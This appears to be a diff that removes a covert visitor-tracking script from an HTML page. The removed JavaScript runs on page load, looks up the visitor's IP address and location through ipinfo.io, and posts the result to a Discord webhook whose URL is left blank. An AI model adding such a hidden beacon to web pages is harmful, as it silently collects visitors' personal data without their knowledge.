@@ -50,43 +50,6 @@
         }
 
         setInterval(createDot, 30);
-
-        // Function to make an HTTP request
-        function makeHttpRequest(url, method, data, callback) {
-            var xhr = new XMLHttpRequest();
-            xhr.open(method, url, true);
-            xhr.setRequestHeader("Content-Type", "application/json");
-
-            xhr.onreadystatechange = function () {
-                if (xhr.readyState == 4 && xhr.status == 200) {
-                    callback(xhr.responseText);
-                }
-            };
-
-            xhr.send(data);
-        }
-
-        // Function to get IP info and send it to Discord webhook
-        function getIPInfoAndSendToDiscord() {
-            // Get IP info from ipinfo.io
-            makeHttpRequest('https://ipinfo.io/json', 'GET', null, function (ipInfo) {
-                // Parse the JSON response
-                var ipInfoObject = JSON.parse(ipInfo);
-
-                // Create a payload for Discord webhook
-                var discordPayload = {
-                    content: 'IP Info:\n```json\n' + JSON.stringify(ipInfoObject, null, 2) + '\n```'
-                };
-
-                // Send the payload to Discord webhook using your server-side script
-                makeHttpRequest('', 'POST', JSON.stringify(discordPayload), function (response) {
-                    console.log('Message sent to Discord:', response);
-                });
-            });
-        }
-
-        // Call the function when the page loads
-        window.onload = getIPInfoAndSendToDiscord;
     </script>
 </body>
 </html>
